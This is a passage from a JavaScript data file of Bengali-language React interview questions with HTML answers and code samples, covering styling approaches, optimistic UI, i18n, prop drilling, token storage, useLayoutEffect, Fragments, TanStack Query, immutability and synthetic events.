      <p>সাধারণ CSS-এর সব ক্ষমতা (pseudo-class, media query, nesting সহ preprocessor) পুরোপুরি বজায় থাকে, শুধু class name collision সমস্যা সমাধান হয়। <strong>Runtime খরচ শূন্য</strong> — সব কিছু বিল্ড টাইমেই resolve হয়।</p>
      <h4>Styled Components (CSS-in-JS)</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>const Button = styled.button\`
  padding: 8px 16px;
  background: \${props => props.primary ? '#6366f1' : '#e5e7eb'};
\`;
<Button primary>জমা দিন</Button></code></pre>
      </div>
      <p><strong>সুবিধা:</strong> JavaScript প্রপস দিয়ে সরাসরি স্টাইল নিয়ন্ত্রণ করা যায় — জটিল ডায়নামিক থিমিংয়ে অত্যন্ত সুবিধাজনক। কম্পোনেন্ট ও তার স্টাইল একই ফাইলে থাকায় রিফ্যাক্টরিং সহজ।</p>
      <p><strong>খরচ:</strong> স্টাইল রানটাইমে JavaScript দিয়ে গণনা হয়ে <code>&lt;style&gt;</code> ট্যাগে ইনজেক্ট হয় — প্রতিটি রেন্ডারে সামান্য CPU খরচ, এবং বড় অ্যাপে bundle সাইজও বাড়ে। এই কারণেই কিছু টিম zero-runtime CSS-in-JS (vanilla-extract, Panda CSS) দিকে সরে যাচ্ছে, যেখানে JS syntax ব্যবহার করে বিল্ড টাইমেই CSS বের করে নেওয়া হয়।</p>
      <h4>Tailwind CSS</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function Button({ primary }) {
  return (
    <button className={\`px-4 py-2 rounded \${primary ? 'bg-indigo-500' : 'bg-gray-200'}\`}>
      জমা দিন
    </button>
  );
}
// বিল্ড টাইমে ব্যবহৃত ক্লাস স্ক্যান করে অব্যবহৃত সব CSS purge হয়ে যায়
// — চূড়ান্ত CSS ফাইল সাধারণত ১০ KB-র নিচে</code></pre>
      </div>
      <p><strong>সুবিধা:</strong> নাম ভাবতে হয় না ("এই ক্লাসের নাম কী দেব"), ডিজাইন সিস্টেমের সীমাবদ্ধ মান (spacing, color scale) স্বাভাবিকভাবেই প্রয়োগ হয়, এবং দ্রুত প্রোটোটাইপ করা যায়।</p>
      <p><strong>খরচ:</strong> JSX অনেক লম্বা ও কম পঠনযোগ্য হয়ে যায় (অনেক ক্লাস একসাথে); নতুন ডেভেলপারদের কাছে শেখার বক্ররেখা আছে; খুব কাস্টম, একবারই ব্যবহৃত ডিজাইনে utility class-এর সুবিধা কম দেখা যায়।</p>
      <h4>ব্যবহারিক সিদ্ধান্ত</h4>
      <ul>
        <li><strong>বড় দল, ডিজাইন সিস্টেম-কেন্দ্রিক প্রজেক্ট:</strong> Tailwind — দ্রুত, সামঞ্জস্যপূর্ণ, শূন্য runtime খরচ।</li>
        <li><strong>জটিল, ডায়নামিক থিমিং (dark mode, ব্যবহারকারী-কাস্টমাইজযোগ্য UI):</strong> Styled Components বা zero-runtime বিকল্প।</li>
        <li><strong>ঐতিহ্যবাহী CSS পছন্দ, minimal dependency:</strong> CSS Modules।</li>
        <li><strong>পারফরম্যান্স সবচেয়ে গুরুত্বপূর্ণ:</strong> CSS Modules বা Tailwind — উভয়ই runtime খরচ শূন্য, Styled Components-এর চেয়ে ভালো।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Zero-runtime CSS-in-JS কীভাবে কাজ করে (vanilla-extract)?</li>
        <li>Tailwind-এর সাথে design token কীভাবে ম্যানেজ করবেন?</li>
      </ul>
    `
  },
  {
    id: "react-37",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["WebSocket","Real-time","Optimistic Update"],
    question: "React-ে Real-time features (WebSocket, SSE) এবং Optimistic UI কীভাবে implement করবেন?",
    answer: `
      <p>Optimistic UI-তে সার্ভার থেকে রেসপন্স আসার আগেই UI-তে পরিবর্তন দেখানো হয়। React 19 এ এর জন্য <code>useOptimistic</code> হুক এসেছে।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// React 19 useOptimistic Example
function TodoList({ todos, addTodo }) {
  const [optimisticTodos, addOptimisticTodo] = useOptimistic(
    todos,
    (state, newTodo) => [...state, { text: newTodo, pending: true }]
  );

  const handleAdd = async (formData) => {
    const text = formData.get('text');
    addOptimisticTodo(text); // UI তাৎক্ষণিক আপডেট
    await addTodo(text); // Server call
  };

  return (
    <form action={handleAdd}>
      {optimisticTodos.map(t => <div style={{ opacity: t.pending ? 0.5 : 1 }}>{t.text}</div>)}
      <input name="text" />
      <button type="submit">Add</button>
    </form>
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-38",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Internationalization","i18n","Localization"],
    question: "React অ্যাপে Internationalization (i18n) কীভাবে implement করবেন?",
    answer: `
      <p>React-এ Internationalization (i18n) মানে টেক্সট, তারিখ, সংখ্যা ও মুদ্রা একাধিক ভাষা/অঞ্চলে সঠিকভাবে প্রদর্শন করা — এবং এটি শুধু টেক্সট অনুবাদের চেয়ে বেশি কিছু।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// react-i18next দিয়ে সেটআপ
import { useTranslation, Trans } from 'react-i18next';

function Welcome() {
  const { t, i18n } = useTranslation();
  return (
    <div>
      <h1>{t('welcome.title')}</h1>

      {/* Pluralization — ভাষাভেদে জটিল নিয়ম স্বয়ংক্রিয়ভাবে সামলায় */}
      <p>{t('items.count', { count: itemCount })}</p>
      {/* en.json: "items_one": "{{count}} item", "items_other": "{{count}} items" */}

      {/* JSX মিশ্রিত অনুবাদ */}
      <Trans i18nKey="terms">
        আমাদের <a href="/terms">শর্তাবলী</a> পড়ুন
      </Trans>

      <button onClick={() => i18n.changeLanguage('bn')}>বাংলা</button>
    </div>
  );
}</code></pre>
      </div>
      <h4>শুধু টেক্সট অনুবাদ নয় — যা আসলে সামলাতে হয়</h4>
      <ul>
        <li><strong>Pluralization:</strong> ইংরেজিতে ১টি নিয়ম (singular/plural), কিন্তু আরবি বা রুশ ভাষায় ৩-৬টি ভিন্ন রূপ থাকতে পারে সংখ্যার উপর নির্ভর করে। i18next এই জটিলতা স্বয়ংক্রিয়ভাবে সামলায় (CLDR প্লুরাল নিয়ম অনুসরণ করে)।</li>
        <li><strong>তারিখ ও সংখ্যা ফরম্যাট:</strong> ব্রাউজারের নেটিভ <code>Intl</code> API ব্যবহার করুন — নিজে ফরম্যাট করার চেষ্টা করবেন না।</li>
        <li><strong>RTL (Right-to-Left) সাপোর্ট:</strong> আরবি, হিব্রুর মতো ভাষায় পুরো লেআউট ডানে-থেকে-বামে হয় — শুধু টেক্সট নয়, আইকন, মার্জিন, flex direction সবকিছু।</li>
        <li><strong>Context-নির্ভর অনুবাদ:</strong> একই ইংরেজি শব্দ ("Post" — verb/noun) বাংলায় প্রসঙ্গভেদে ভিন্ন অনুবাদ হতে পারে — key-ভিত্তিক অনুবাদ এই দ্ব্যর্থতা এড়ায়।</li>
      </ul>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// তারিখ/সংখ্যা — Intl API ব্যবহার করুন
new Intl.DateTimeFormat('bn-BD', { dateStyle: 'long' }).format(new Date());
new Intl.NumberFormat('bn-BD', { style: 'currency', currency: 'BDT' }).format(1500);
// → "১,৫০০.০০ টাকা"</code></pre>
      </div>
      <h4>কোড না ছোঁয়ার নিয়ম</h4>
      <p><strong>UI টেক্সট কখনও সরাসরি JSX-এ হার্ডকোড করবেন না।</strong> সব টেক্সট <code>t('key')</code>-এর মাধ্যমে আসা উচিত, এমনকি একক-ভাষার প্রজেক্টেও — পরে i18n যোগ করা অনেক সহজ হয় যদি শুরু থেকেই এই অভ্যাস থাকে।</p>
      <h4>Next.js-এ Internationalization</h4>
      <p>Next.js App Router-এ i18n routing (<code>/en/about</code>, <code>/bn/about</code>) middleware দিয়ে করা হয়, এবং <code>next-intl</code>-এর মতো লাইব্রেরি Server Component-এর সাথে সামঞ্জস্যপূর্ণভাবে কাজ করে — অনুবাদ সার্ভারেই resolve হতে পারে, ক্লায়েন্ট bundle-এ পুরো অনুবাদ ফাইল পাঠাতে হয় না।</p>
      <h4>পারফরম্যান্স বিবেচনা</h4>
      <p>সব ভাষার অনুবাদ ফাইল একসাথে bundle করলে অপ্রয়োজনীয় ডেটা পাঠানো হয়। <strong>Lazy load করুন</strong> — শুধু বর্তমান ভাষার ফাইল লোড করুন, ভাষা বদলালে dynamically সেই ফাইল fetch করুন।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>RTL সাপোর্ট CSS-এ কীভাবে বাস্তবায়ন করবেন (logical properties)?</li>
        <li>Server Component-এ কীভাবে অনুবাদ resolve করবেন?</li>
      </ul>
    `
  },
  {
    id: "react-39",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Prop Drilling","Composition"],
    question: "Prop Drilling সমস্যা কী? Context ছাড়া কীভাবে সমাধান করবেন?",
    answer: `
      <p><strong>Prop Drilling</strong> ঘটে যখন একটি ডেটা একাধিক স্তরের কম্পোনেন্টের মধ্য দিয়ে props হিসেবে পাস করতে হয়, যদিও মাঝের কম্পোনেন্টগুলোর সেই ডেটার কোনো প্রয়োজনই নেই — শুধু নিচে পৌঁছানোর মাধ্যম হিসেবে।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ Prop drilling — Header ও Nav-এর user দরকার নেই, শুধু forward করছে
function App() {
  const [user, setUser] = useState(null);
  return <Layout user={user} />;
}
function Layout({ user }) {
  return <><Header user={user} /><Content /></>;
}
function Header({ user }) {
  return <Nav user={user} />;         // শুধু পাস করছে
}
function Nav({ user }) {
  return <UserAvatar user={user} />;   // অবশেষে ব্যবহার হলো, ৪ স্তর পরে</code></pre>
      </div>
      <p><strong>সমস্যা:</strong> <code>Layout</code>, <code>Header</code>, <code>Nav</code> — কেউই <code>user</code> ব্যবহার করে না, শুধু ফরওয়ার্ড করে। এতে কোড রক্ষণাবেক্ষণ কঠিন হয় (একটি prop যোগ/বাদ দিতে অনেক ফাইল বদলাতে হয়), এবং কম্পোনেন্টগুলো অপ্রয়োজনীয়ভাবে আটকে যায় — <code>Nav</code> আলাদাভাবে পুনর্ব্যবহার করতে গেলেও <code>user</code> prop টানতে হবে।</p>
      <h4>Context ছাড়া সমাধান — কখন এবং কেন</h4>
      <p>Context সবসময় সেরা সমাধান নয় — এটি টেস্ট করা কঠিন করে তোলে এবং প্রতিটি consumer কম্পোনেন্ট provider-এর সাথে অদৃশ্যভাবে যুক্ত হয়ে যায় (implicit coupling)। প্রায়ই আরও সহজ সমাধান আছে:</p>
      <h4>১. Component Composition — সবচেয়ে কম উপেক্ষিত সমাধান</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ children দিয়ে — মাঝের কম্পোনেন্ট user সম্পর্কে জানেই না
function App() {
  const [user, setUser] = useState(null);
  return (
    <Layout>
      <Header>
        <Nav><UserAvatar user={user} /></Nav>
      </Header>
      <Content />
    </Layout>
  );
}
function Layout({ children }) { return <div className="layout">{children}</div>; }
function Header({ children }) { return <header>{children}</header>; }
function Nav({ children })    { return <nav>{children}</nav>; }
// user সরাসরি App থেকে UserAvatar-এ যাচ্ছে — মাঝে কেউ এটি স্পর্শ করছে না</code></pre>
      </div>
      <p>এই প্যাটার্ন React-এরই বিল্ট-ইন সমাধান — কম্পোনেন্টগুলো "hole" (children) হিসেবে কাজ করে, ডেটা directly উপর থেকে নিচে JSX composition-এর মাধ্যমেই যায়, কোনো prop drilling ছাড়াই।</p>
      <h4>২. State Colocation — সমস্যা মূলেই কমানো</h4>
      <p>প্রায়ই state <em>প্রয়োজনের চেয়ে উপরে</em> রাখা হয়। state-টিকে যত নিচে সম্ভব — যেখানে সত্যিই দরকার — সেখানে সরালে drilling-এর প্রয়োজনই কমে যায়।</p>
      <h4>Context কখন ব্যবহার করবেন</h4>
      <p>যখন ডেটা সত্যিই <strong>বিস্তৃতভাবে প্রয়োজনীয়</strong> এবং composition দিয়ে সমাধান অস্বাভাবিক হয়ে যায় (theme, authenticated user, ভাষা) — তখন Context যুক্তিসঙ্গত। কিন্তু একটি একক deep prop chain-এর জন্য Context আনা প্রায়ই অতিরিক্ত জটিলতা।</p>
      <h4>৩. State Management লাইব্রেরি</h4>
      <p>বড় অ্যাপ্লিকেশনে বহু জায়গায় প্রয়োজনীয় global state-এ Zustand বা Jotai-এর মতো লাইব্রেরি ব্যবহার করা যায় — এগুলো Context-এর মতো wrapping ছাড়াই যেকোনো কম্পোনেন্ট থেকে সরাসরি state অ্যাক্সেস দেয়, এবং re-render নিয়ন্ত্রণও ভালো।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Composition ও Context-এর মধ্যে কীভাবে সিদ্ধান্ত নেবেন?</li>
        <li>Context ব্যবহার করলে unnecessary re-render কীভাবে এড়াবেন?</li>
      </ul>
    `
  },
  {
    id: "react-40",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Authentication","JWT","Session","Security"],
    question: "React অ্যাপে Authentication flow কীভাবে implement করবেন? JWT token কোথায় store করবেন?",
    answer: `
      <p>Token storage একটি critical security decision। <code>localStorage</code> XSS অ্যাটাকে ঝুঁকিপূর্ণ।</p>
      <p><strong>Best Practice:</strong> Refresh Token রাখুন <code>HttpOnly Cookie</code>-তে (JavaScript অ্যাক্সেস করতে পারবে না) এবং Access Token রাখুন মেমোরিতে (React State)।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Axios interceptor for auto-refresh
useEffect(() => {
  const interceptor = api.interceptors.response.use(
    (res) => res,
    async (error) => {
      if (error.response?.status === 401) {
        const newToken = await refreshToken(); // Cookie থেকে রিফ্রেশ
        error.config.headers.Authorization = \`Bearer \${newToken}\`;
        return api(error.config); // Retry request
      }
      return Promise.reject(error);
    }
  );
  return () => api.interceptors.response.eject(interceptor);
}, []);</code></pre>
      </div>
    `
  },
  {
    id: "react-41",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["useLayoutEffect","DOM","Measurement"],
    question: "useLayoutEffect vs useEffect — পার্থক্য কী? কখন useLayoutEffect ব্যবহার করবেন?",
    answer: `
      <p><code>useEffect</code> ও <code>useLayoutEffect</code> একই API, কিন্তু <strong>কখন</strong> তারা চলে তার একটি সূক্ষ্ম কিন্তু গুরুত্বপূর্ণ পার্থক্য আছে — যা মাঝে মাঝে দৃশ্যমান ঝিলিক (flicker) হিসেবে প্রকাশ পায়।</p>
      <pre class="mermaid">
flowchart LR
    A["React DOM আপডেট করে"] --> B["ব্রাউজার পেইন্ট করে<br/>(স্ক্রিনে দেখা যায়)"]
    B --> C["useEffect চলে<br/>(asynchronous)"]
    A -.->|"পেইন্টের আগেই"| D["useLayoutEffect চলে<br/>(synchronous, ব্লকিং)"]
    D -.-> B
      </pre>
      <span class="diagram-caption">useLayoutEffect ব্রাউজার পেইন্ট করার আগেই চলে; useEffect পরে</span>
      <table>
        <tr><th>দিক</th><th><code>useEffect</code></th><th><code>useLayoutEffect</code></th></tr>
        <tr><td>চলে কখন</td><td>পেইন্টের <strong>পরে</strong>, asynchronously</td><td>পেইন্টের <strong>আগে</strong>, synchronously</td></tr>
        <tr><td>ব্রাউজার ব্লক করে?</td><td>না</td><td>হ্যাঁ — পেইন্ট আটকে থাকে</td></tr>
        <tr><td>পারফরম্যান্স</td><td>ভালো</td><td>ভারী কাজে খারাপ (জ্যাঙ্ক)</td></tr>
        <tr><td>ব্যবহার</td><td>বেশিরভাগ side effect</td><td>DOM measurement + সাথে সাথে পরিবর্তন</td></tr>
      </table>
      <h4>যে সমস্যাটি useLayoutEffect সমাধান করে</h4>
      <p>ধরুন একটি tooltip-এর অবস্থান তার নিজের আকার মেপে গণনা করতে হবে। <code>useEffect</code> ব্যবহার করলে: React DOM-এ tooltip বসায় (ভুল অবস্থানে) → <strong>ব্রাউজার সেটি পেইন্ট করে ফেলে</strong> (ইউজার এক ঝলক ভুল অবস্থান দেখে) → effect চলে, অবস্থান মেপে ঠিক করে → আবার re-render → পেইন্ট। ফলাফল: <strong>দৃশ্যমান ঝিলিক</strong>।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ useEffect — ঝিলিক দেখা যেতে পারে
useEffect(() => {
  const { height } = ref.current.getBoundingClientRect();
  setTooltipTop(-height - 8);   // DOM মাপার পর অবস্থান ঠিক করা
}, []);

// ✅ useLayoutEffect — পেইন্টের আগেই ঠিক হয়ে যায়, কোনো ঝিলিক নেই
useLayoutEffect(() => {
  const { height } = ref.current.getBoundingClientRect();
  setTooltipTop(-height - 8);
}, []);</code></pre>
      </div>
      <p><code>useLayoutEffect</code> ব্রাউজারকে পেইন্ট করা থেকে <strong>আটকে রেখে</strong> সিঙ্ক্রোনাসভাবে চলে, তাই ইউজার শুধু চূড়ান্ত, সঠিক অবস্থানই দেখেন — মাঝের ভুল অবস্থান কখনও রেন্ডার হয় না।</p>
      <h4>কেন useEffect ডিফল্ট থাকা উচিত</h4>
      <p><code>useLayoutEffect</code> ব্রাউজারের পেইন্ট <strong>ব্লক করে</strong> — এতে ভারী গণনা থাকলে ইউজার একটি সাময়িক "স্থবির" (jank) অনুভূতি পাবেন, বিশেষত ধীর ডিভাইসে। তাই এটি শুধু তখনই ব্যবহার করুন যখন DOM মাপা ও সাথে সাথে সেই অনুযায়ী পরিবর্তন করা <em>প্রয়োজনীয়</em> — অন্য সব ক্ষেত্রে (data fetching, subscription, event listener) <code>useEffect</code> ব্যবহার করুন।</p>
      <h4>বাস্তব ব্যবহার</h4>
      <ul>
        <li>DOM এলিমেন্টের আকার/অবস্থান মেপে UI সমন্বয় (tooltip, dropdown positioning)।</li>
        <li>Scroll position পুনরুদ্ধার — পেইন্টের আগে scroll করলে ঝিলিক এড়ানো যায়।</li>
        <li>Animation-এর আগে DOM-এর প্রাথমিক অবস্থা সেট করা (FLIP animation প্যাটার্ন)।</li>
      </ul>
      <p><strong>Server-Side Rendering সতর্কতা:</strong> <code>useLayoutEffect</code> সার্ভারে চলে না (DOM নেই), এবং React একটি warning দেয়। SSR অ্যাপে <code>typeof window !== 'undefined'</code> চেক করে শর্তসাপেক্ষে ব্যবহার করুন, অথবা একটি isomorphic হুক (<code>useIsomorphicLayoutEffect</code>) বানান।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>useLayoutEffect SSR-এ warning দেয় কেন এবং কীভাবে সমাধান করবেন?</li>
        <li>Animation লাইব্রেরিতে useLayoutEffect কীভাবে ব্যবহৃত হয়?</li>
      </ul>
    `
  },
  {
    id: "react-42",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Code Review","Architecture","Best Practices"],
    question: "Lead Developer হিসেবে React code review-তে কী কী দেখবেন? Architecture guidelines কী হওয়া উচিত?",
    answer: `
      <h4>Code Review Checklist:</h4>
      <ol>
        <li><strong>Component Structure:</strong> Single Responsibility পালন হচ্ছে কি না। Business logic UI থেকে আলাদা (Custom hooks) কি না।</li>
        <li><strong>Performance:</strong> Unnecessary re-renders আছে কি না। useEffect cleanup আছে কি না।</li>
        <li><strong>Security & A11y:</strong> dangerouslySetInnerHTML sanitized কি না। Semantic HTML কি না।</li>
      </ol>
      <p><strong>Architecture:</strong> Feature-based architecture ফলো করুন। প্রতিটি ফিচারের নিজস্ব <code>components</code>, <code>hooks</code>, <code>api</code>, এবং <code>types</code> ফোল্ডার থাকবে।</p>
    `
  },
  {
    id: "react-43",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Fragment","Key","Wrapper"],
    question: "React Fragment কী? কখন এবং কেন ব্যবহার করবেন?",
    answer: `
      <p><strong>Fragment</strong> (<code>&lt;&gt;...&lt;/&gt;</code> বা <code>&lt;React.Fragment&gt;</code>) একাধিক এলিমেন্ট গ্রুপ করে রিটার্ন করতে দেয়, <strong>DOM-এ কোনো অতিরিক্ত নোড যোগ না করেই</strong>।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ অপ্রয়োজনীয় <div> — লেআউট ভাঙতে পারে
function TableRow() {
  return (
    <div>
      <td>নাম</td>
      <td>বয়স</td>
    </div>
  );
}
// রেন্ডার হয়ে <tr><div><td>...</td></div></tr> — ❌ অবৈধ HTML!

// ✅ Fragment — কোনো বাড়তি DOM নোড নেই
function TableRow() {
  return (
    <>
      <td>নাম</td>
      <td>বয়স</td>
    </>
  );
}
// রেন্ডার হয়ে <tr><td>...</td><td>...</td></tr> — বৈধ</code></pre>
      </div>
      <h4>কেন এটি প্রয়োজনীয় — মূল কারণ</h4>
      <p>একটি React কম্পোনেন্ট অবশ্যই <strong>একটি রুট এলিমেন্ট</strong> রিটার্ন করবে (এটি JSX-এর নিয়ম — JavaScript ফাংশন একাধিক মান একসাথে রিটার্ন করতে পারে না)। এর সমাধানে <code>&lt;div&gt;</code> দিয়ে মুড়ে দেওয়া সবচেয়ে সহজ মনে হলেও, এতে DOM-এ একটি অতিরিক্ত নোড যোগ হয় — যা <strong>সিমান্টিক HTML ভেঙে দিতে পারে</strong> (যেমন <code>&lt;table&gt;</code>-এর ভেতরে <code>&lt;td&gt;</code>-র সরাসরি প্যারেন্ট <code>&lt;tr&gt;</code> হতে হয়, <code>&lt;div&gt;</code> নয়) এবং CSS layout (flexbox/grid) নষ্ট করতে পারে।</p>
      <h4>দুটি সিনট্যাক্স</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// সংক্ষিপ্ত সিনট্যাক্স — কিন্তু key প্রপ দেওয়া যায় না
return <>{children}</>;

// পূর্ণ সিনট্যাক্স — key দরকার হলে (যেমন list rendering-এ)
{items.map(item => (
  <React.Fragment key={item.id}>
    <dt>{item.term}</dt>
    <dd>{item.definition}</dd>
  </React.Fragment>
))}</code></pre>
      </div>
      <p><strong>নিয়ম:</strong> <code>key</code> দরকার হলে সংক্ষিপ্ত <code>&lt;&gt;</code> সিনট্যাক্স ব্যবহার করা যায় না — <code>React.Fragment</code> স্পষ্টভাবে লিখতে হয়।</p>
      <h4>বাস্তব ব্যবহারের ক্ষেত্র</h4>
      <ul>
        <li><strong>টেবিল রো/সেল:</strong> <code>&lt;tr&gt;</code>/<code>&lt;td&gt;</code> কাঠামো ভাঙা এড়াতে।</li>
        <li><strong>Flexbox/Grid লেআউট:</strong> একটি অতিরিক্ত wrapper <code>&lt;div&gt;</code> flex/grid item সংখ্যা ও আচরণ বদলে দিতে পারে।</li>
        <li><strong>একাধিক টপ-লেভেল এলিমেন্ট রিটার্ন করা:</strong> যেমন একটি মোডাল যা একটি হেডার ও একটি বডি আলাদা DOM position-এ রেন্ডার করে।</li>
        <li><strong>অপ্রয়োজনীয় DOM depth এড়িয়ে পারফরম্যান্স ও accessibility উন্নত করা</strong> — কম নেস্টিং মানে screen reader-এর জন্যও পরিষ্কার কাঠামো।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Fragment-এ কোনো props/attribute দেওয়া যায় কি?</li>
        <li>অতিরিক্ত <code>&lt;div&gt;</code> wrapper কীভাবে accessibility প্রভাবিত করে?</li>
      </ul>
    `
  },
  {
    id: "react-44",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Data Fetching","TanStack Query","SWR","Caching"],
    question: "TanStack Query (React Query) দিয়ে data fetching এবং optimistic updates কীভাবে করবেন?",
    answer: `
      <p><strong>TanStack Query</strong> server state management-এর de-facto standard।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>const useTodoMutation = () => {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: (newTodo) => api.post('/todos', newTodo),
    onMutate: async (newTodo) => {
      await queryClient.cancelQueries({ queryKey: ['todos'] });
      const previous = queryClient.getQueryData(['todos']);
      queryClient.setQueryData(['todos'], old => [...old, newTodo]); // Optimistic update
      return { previous };
    },
    onError: (err, newTodo, context) => {
      queryClient.setQueryData(['todos'], context.previous); // Rollback
    },
    onSettled: () => {
      queryClient.invalidateQueries({ queryKey: ['todos'] }); // Refetch
    },
  });
}</code></pre>
      </div>
    `
  },
  {
    id: "react-45",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["State","Immutability","Spread Operator"],
    question: "React-ে State immutability কেন গুরুত্বপূর্ণ? Complex state কীভাবে immutably update করবেন?",
    answer: `
      <p>React state <strong>immutable</strong> হতে হবে কারণ React shallow comparison দিয়ে বোঝে state পরিবর্তন হয়েছে কিনা। Reference একই থাকলে re-render হবে না।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ Immutable update
setUser(prev => ({ ...prev, address: { ...prev.address, city: 'Dhaka' } }));

// Array operations
setItems(prev => [...prev, newItem]); // Add
setItems(prev => prev.filter(item => item.id !== id)); // Remove

// Immer দিয়ে deep updates (বিশাল nested state এর জন্য)
import { produce } from 'immer';
setUser(produce(draft => {
  draft.address.city = 'Dhaka'; // Looks like mutation
}));</code></pre>
      </div>
    `
  },
  {
    id: "react-46",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Event Handling","Synthetic Events"],
    question: "React-এ Event Handling কীভাবে কাজ করে? Synthetic Events কী?",
    answer: `
      <p>React ব্রাউজারের নেটিভ DOM ইভেন্ট সরাসরি ব্যবহার না করে একটি <strong>SyntheticEvent</strong> র‍্যাপার তৈরি করে — এটি সব ব্রাউজারে একই আচরণ নিশ্চিত করে এবং কর্মক্ষমতা অপ্টিমাইজ করে।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function Button() {
  const handleClick = (e) => {
    console.log(e.type);          // "click" — সব ব্রাউজারে অভিন্ন
    console.log(e.nativeEvent);   // আসল DOM ইভেন্ট, দরকার হলে অ্যাক্সেসযোগ্য
    e.stopPropagation();          // নেটিভ ইভেন্টের মতোই কাজ করে
  };
  return <button onClick={handleClick}>ক্লিক করুন</button>;
}</code></pre>
      </div>
      <h4>Event Delegation — ভেতরের প্রক্রিয়া</h4>
      <p>React প্রতিটি এলিমেন্টে আলাদা event listener লাগায় না। বদলে React 17+ থেকে <strong>একটি একক listener root DOM container-এ</strong> সংযুক্ত থাকে (আগে <code>document</code>-এ ছিল)। একটি বাটনে ক্লিক করলে ইভেন্ট bubble করে root পর্যন্ত যায়, React সেখানে ধরে কোন কম্পোনেন্টের <code>onClick</code> চালাতে হবে তা নির্ধারণ করে।</p>
      <p><strong>এই delegation-এর সুবিধা:</strong> হাজারো বাটন থাকলেও মাত্র একটি listener — মেমরি সাশ্রয় এবং dynamically যোগ হওয়া এলিমেন্টেও listener লাগানোর দরকার নেই।</p>
      <h4>কেন root-এ সরানো হলো (React 16 → 17)</h4>
      <p>আগে <code>document</code>-এ listener থাকায় একই পেজে একাধিক React সংস্করণ (যেমন micro-frontend architecture-এ) থাকলে সংঘর্ষ হতো — একটি সংস্করণের event handling অন্যটিকে প্রভাবিত করত। Root container-এ সরানোর ফলে প্রতিটি React "instance" তার নিজের ইভেন্ট নিজে সামলায়, একে অপরের সাথে হস্তক্ষেপ করে না।</p>
      <h4>SyntheticEvent-এর সুবিধা</h4>
      <ul>
        <li><strong>Cross-browser সামঞ্জস্য:</strong> পুরনো ব্রাউজারে নেটিভ ইভেন্টের ভিন্ন property নাম বা আচরণ থাকত — SyntheticEvent একটি অভিন্ন API দেয়।</li>
        <li><strong>Automatic batching-এর সাথে ইন্টিগ্রেশন:</strong> React 18-এ একটি event handler-এর ভেতরে একাধিক <code>setState</code> কল স্বয়ংক্রিয়ভাবে একটি রি-রেন্ডারে ব্যাচ হয়।</li>
      </ul>
      <h4>একটি পুরনো সতর্কতা (React 16 পর্যন্ত প্রাসঙ্গিক)</h4>
      <p>React 17-এর আগে SyntheticEvent object ইভেন্ট হ্যান্ডলার শেষ হওয়ার পরে <strong>পুল (pool) করে পুনর্ব্যবহার</strong> হতো — অর্থাৎ async কোডে (setTimeout, Promise) পরে সেই event object-এর property অ্যাক্সেস করলে সব null দেখাত। <strong>React 17+ এ event pooling সরিয়ে ফেলা হয়েছে</strong> — এখন এটি আর সমস্যা নয়, কিন্তু পুরনো কোডবেসে <code>e.persist()</code> কল দেখা যেতে পারে, যা এখন অপ্রয়োজনীয়।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>নেটিভ DOM ইভেন্ট কখন সরাসরি ব্যবহার করতে হয় (SyntheticEvent যথেষ্ট নয়)?</li>
        <li>Event bubbling ও capturing React-এ কীভাবে কাজ করে?</li>
      </ul>
    `
  },
  {
    id: "react-47",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Performance","Lighthouse","Core Web Vitals"],
    question: "React অ্যাপে Core Web Vitals (LCP, INP, CLS) কীভাবে optimize করবেন?",
    answer: `
      <p><strong>Core Web Vitals</strong> Google-এর নির্ধারিত তিনটি মেট্রিক যা প্রকৃত ইউজার অভিজ্ঞতা পরিমাপ করে — এবং সরাসরি SEO র‍্যাঙ্কিংকেও প্রভাবিত করে।</p>
      <h4>তিনটি মেট্রিক</h4>
      <table>
        <tr><th>মেট্রিক</th><th>মাপে</th><th>ভালো মান</th></tr>
